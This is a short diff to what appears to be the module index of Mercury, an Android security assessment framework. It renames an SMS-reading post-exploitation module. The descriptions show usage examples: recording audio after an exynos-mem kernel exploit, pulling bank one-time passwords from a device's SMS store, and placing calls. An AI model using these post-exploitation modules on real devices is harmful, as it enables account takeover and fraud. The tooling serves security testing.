@@ -12,7 +12,7 @@ The provided exploit makes use of the fact that /dev/exynos-mem is marked as glo
 [+] Recording started
 [+] Press [Enter] to stop recording
 [+] Stopped...downloading recording
-[+] Done.</description></module><module name="metall0id.post.read_sms"><description>mercury&gt; run post.read.sms -f otp
+[+] Done.</description></module><module name="metall0id.post.sms"><description>mercury&gt; run post.sms.read -f otp
 | body                             | date_sent     | address      | person |
 | Fakey Bank. Payment OTP 1d5gv578 | 1366708779000 | +27731356743 | null   |
 | Fakey Bank. Payment OTP a4g6h8jk | 1366708795000 | +27731356743 | null   |</description></module><module name="metall0id.post.call"><description>mercury&gt; run post.perform.call +27123456789
